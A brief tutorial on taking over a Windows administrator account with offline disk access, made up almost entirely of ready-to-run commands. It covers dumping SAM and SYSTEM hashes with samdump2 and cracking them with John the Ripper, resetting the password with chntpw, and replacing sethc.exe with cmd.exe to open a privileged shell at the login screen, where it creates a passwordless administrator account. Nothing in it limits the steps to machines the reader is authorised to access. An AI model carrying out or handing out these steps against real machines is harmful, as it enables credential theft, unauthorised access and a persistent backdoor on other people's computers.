Become administrator in Windows
===============================


Different methods
-----------------

1) Bruteforce password

- John-the-ripper
http://www.openwall.com/john/
- samdump2
http://sourceforge.net/projects/ophrack/files/samdump2/

2) Replace current password

- chntpw
http://pogostick.net/~pnh/ntpasswd/

3) Exploit the sethc.exe bug and make a new account


HOWTO
-----

### Common for all methods

	# mkdir <DIR>
	# mount -t ntfs <WINDISK> <DIR>


### Bruteforce password

	# cd <DIR>/Windows/System32/config
	# samdump2 SYSTEM SAM > ~/hive
	# cat ~/hive | grep Administrator > ~/nt-hash
	# john --format=NT ~/nt-hash

	...wait...


### Replace current password

	# cd <DIR>/Windows/System32/config
	# chntpw -l SAM
	# chntpw -u Administrator


### Exploit sethc.exe bug

	# cd <DIR>/Windows/System32
	# mv sethc.exe sethc.bak
	# cp cmd.exe sethc.exe
	# sync
	# reboot

Let Windows boot. Press SHIFT five times.
cmd.exe opens up with administrative privileges.

	> net user foobar /add /passwordreq:no
	> net localgroup administrators foobar /add
	> exit

Log in using only foobar. Restore sethc.exe, perhaps?

---

*Written by Prodhe*
